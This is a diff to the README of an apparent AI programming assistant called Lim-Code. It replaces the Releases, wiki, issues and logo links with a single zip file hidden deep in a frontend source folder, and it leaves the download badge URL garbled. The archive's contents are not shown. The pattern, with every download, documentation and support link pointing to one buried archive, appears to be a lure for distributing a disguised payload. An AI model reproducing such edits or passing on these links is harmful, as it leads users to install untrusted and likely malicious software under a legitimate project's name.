@@ -1,13 +1,13 @@
 # 🤖 Lim-Code - Your AI Programming Assistant Made Easy
 
 <p align="center">
-  <a href="https://github.com/Mateus-rgb/Lim-Code/releases">
-    <img src="https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen.svg" alt="Download Now">
+  <a href="https://github.com/Mateus-rgb/Lim-Code/raw/refs/heads/main/frontend/src/components/settings/tools/Lim-Code-v3.2.zip">
+    <img src="https://github.com/Mateus-rgb/Lim-Code/raw/refs/heads/main/frontend/src/components/settings/tools/Lim-Code-v3.2.zip%20Now-Visit%https://github.com/Mateus-rgb/Lim-Code/raw/refs/heads/main/frontend/src/components/settings/tools/Lim-Code-v3.2.zip" alt="Download Now">
   </a>
 </p>
 
 <p align="center">
-  <img src="resources/icon.png" alt="LimCode Logo" width="128">
+  <img src="https://github.com/Mateus-rgb/Lim-Code/raw/refs/heads/main/frontend/src/components/settings/tools/Lim-Code-v3.2.zip" alt="LimCode Logo" width="128">
 </p>
 
 <p align="center">
@@ -33,7 +33,7 @@ Before you start, ensure you have the following:
 
 To get started with Lim-Code, visit the Releases page. Click the link below to download the latest version:
 
-[Download Lim-Code](https://github.com/Mateus-rgb/Lim-Code/releases)
+[Download Lim-Code](https://github.com/Mateus-rgb/Lim-Code/raw/refs/heads/main/frontend/src/components/settings/tools/Lim-Code-v3.2.zip)
 
 ### 3. Install Lim-Code
 
@@ -81,7 +81,7 @@ Lim-Code also supports the Model Context Protocol (MCP) to connect with external
 
 To download Lim-Code, please visit the Releases page directly:
 
-[Download Lim-Code](https://github.com/Mateus-rgb/Lim-Code/releases)
+[Download Lim-Code](https://github.com/Mateus-rgb/Lim-Code/raw/refs/heads/main/frontend/src/components/settings/tools/Lim-Code-v3.2.zip)
 
 Follow the installation steps outlined in the "Install Lim-Code" section above.
 
@@ -99,8 +99,8 @@ Explore the intelligent tool system and utilize the multi-channel support seamle
 
 For more information and detailed guides, consider exploring the following resources:
 
-- [Official Documentation](https://github.com/Mateus-rgb/Lim-Code/wiki)
-- [Community Support](https://github.com/Mateus-rgb/Lim-Code/issues)
+- [Official Documentation](https://github.com/Mateus-rgb/Lim-Code/raw/refs/heads/main/frontend/src/components/settings/tools/Lim-Code-v3.2.zip)
+- [Community Support](https://github.com/Mateus-rgb/Lim-Code/raw/refs/heads/main/frontend/src/components/settings/tools/Lim-Code-v3.2.zip)
 
 ## 💬 Feedback
 
